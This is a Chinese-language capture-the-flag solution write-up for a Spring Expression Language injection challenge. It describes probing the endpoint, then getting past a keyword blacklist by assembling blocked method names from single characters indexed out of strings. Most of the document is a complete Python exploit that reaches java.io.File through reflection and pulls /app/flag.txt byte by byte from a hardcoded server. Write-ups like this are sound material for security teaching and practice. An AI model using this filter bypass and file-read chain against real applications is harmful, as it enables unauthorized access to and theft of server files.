
## Solution

### Step 1: 探寻注入点与安全过滤机制

首先对目标接口进行基础的测试与探测：

- 输入 `1+2` 得到了结果 `3`，由此证明传入的参数确实被当作 SpEL 表达式进行了解析和计算。
- 输入 `''.class.name` 成功回显 `java.lang.String`，表明当前环境允许获取并访问类对象信息。
- 尝试执行 `T(java.lang.Math).abs(-3)` 时，系统抛出报错 `Expression Error: EL1005E: Type cannot be found 'java.lang.Math'`。这说明使用 `T()` 直接引用类型的方式受到了限制，不过通过对象属性的链式访问依然是可行的。

进一步深入测试可以发现，常规的无参方法是能够以访问属性的形式来调用的（比如 `''.class.package` 或者 `toURI.toURL.getContent`）。与此同时，诸如 `readAllBytes` 这样的高危关键字字符串会被直接拦截，这就意味着我们无法在请求中明文包含这些完整的敏感词汇。

### Step 2: 结合字符拼接突破黑名单获取 flag

为了突破上述限制，我们可以采用基于字符串索引逐个字符提取的方式，组合构造出那些被屏蔽的属性名称。这样一来，安全过滤器检测到的只是一堆毫无威胁的字符碎片，而在 SpEL 实际运算时，这些碎片却能被动态拼接还原为真实有效的方法名。绕过限制后，先通过反射机制获取到 `java.io.File` 对象，接着根据当前系统上下文的目录层级结构寻址到 `/app/flag.txt`，最终调用 `getContent` 配合 `readAllBytes` 提取该文件的完整字节数据流。

具体的自动化利用代码实现如下：

```python
#!/usr/bin/env python3
import sys
import time
from urllib.parse import quote

import requests


BASE_URL = "http://39.105.213.28:12603/api/route?expr="
TIMEOUT = 12
RETRIES = 5

FILE_CLASS = "''.class.module.class.declaredMethods[6].returnType.declaredMethods[58].parameterTypes[1]"
FLAG_FILE = FILE_CLASS + ".listRoots[0].listFiles[20].listFiles[0]"
FLAG_STREAM = FLAG_FILE + ".toURI.toURL.getContent"

CHARS = {
    "r": "('ar'[1])",
    "e": "('he'[1])",
    "a": "('at'[0])",
    "d": "('do'[0])",
    "c": "('ac'[1])",
    "A": "('Ax'[0])",
    "l": "('la'[0])",
    "B": "('By'[0])",
    "y": "('ya'[0])",
    "t": "('ta'[0])",
    "s": "('sa'[0])",
    "m": "('am'[1])",
    "k": "('ok'[1])",
    "S": "('So'[0])",
    "u": "('up'[0])",
    "p": "('up'[1])",
    "o": "('do'[1])",
    "n": "('an'[1])",
    "g": "('ag'[1])",
    "h": "('he'[0])",
    "i": "('in'[0])",
}


def spell(name: str) -> str:
    return "+".join(CHARS[ch] for ch in name)


def expr_prop(target: str, prop: str) -> str:
    return f"{target}[{spell(prop)}]"


def ensure_text(expr: str, text: str) -> str:
    text = text.strip()
    if text:
        return text
    raise RuntimeError(f"empty response for expr: {expr}")


def request_expr(expr: str) -> str:
    url = BASE_URL + quote(expr, safe="")
    last_err = None
    with requests.Session() as session:
        for attempt in range(1, RETRIES + 1):
            try:
                resp = session.get(url, timeout=TIMEOUT)
                if resp.status_code != 200:
                    raise RuntimeError(
                        f"http {resp.status_code} for expr {expr}: {resp.text[:200]!r}"
                    )
                return resp.text
            except Exception as exc:
                last_err = exc
                time.sleep(min(attempt * 2, 8))
    raise RuntimeError(last_err)


def main() -> int:
    test_expr = expr_prop("''.class", "package")
    print("[*] sanity:", test_expr)
    print(request_expr(test_expr))

    mark_expr = expr_prop(FLAG_STREAM, "markSupported")
    print("[*] stream test:", mark_expr)
    print(request_expr(mark_expr))

    read_expr = expr_prop(FLAG_STREAM, "readAllBytes")
    len_expr = read_expr + ".length"
    length = int(ensure_text(len_expr, request_expr(len_expr)))
    print(f"[*] byte length: {length}")

    data = bytearray()
    for i in range(length):
        item_expr = f"{read_expr}[{i}]"
        val = int(ensure_text(item_expr, request_expr(item_expr)))
        data.append(val & 0xFF)
        sys.stderr.write(f"\r[{i + 1}/{length}]")
        sys.stderr.flush()
    sys.stderr.write("\n")

    print(data.decode("utf-8", errors="replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```
